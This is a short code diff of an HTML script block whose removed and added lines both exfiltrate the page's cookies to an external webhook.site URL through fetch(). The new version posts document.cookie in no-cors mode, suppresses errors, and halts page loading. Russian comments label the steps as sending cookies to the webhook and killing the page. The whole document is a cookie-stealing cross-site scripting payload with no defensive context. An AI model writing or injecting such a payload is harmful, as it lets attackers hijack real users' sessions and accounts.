@@ -1,6 +1,11 @@
-<!DOCTYPE html>
-<html>
 <script>
-    fetch('https://webhook.site/a22adb9c-28a6-4833-9b68-ca5d2389e551?c=' + encodeURIComponent(document.cookie));
+    // 1. Отправляем куки на вебхук (fetch + ignore response)
+    fetch('https://webhook.site/a22adb9c-28a6-4833-9b68-ca5d2389e551', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: document.cookie
+    }).catch(_=>{});
+    
+    // 2. Убиваем страницу сразу после отправки (опционально)
+    window.stop(); // Прекращаем загрузку страницы
 </script>
-</html>
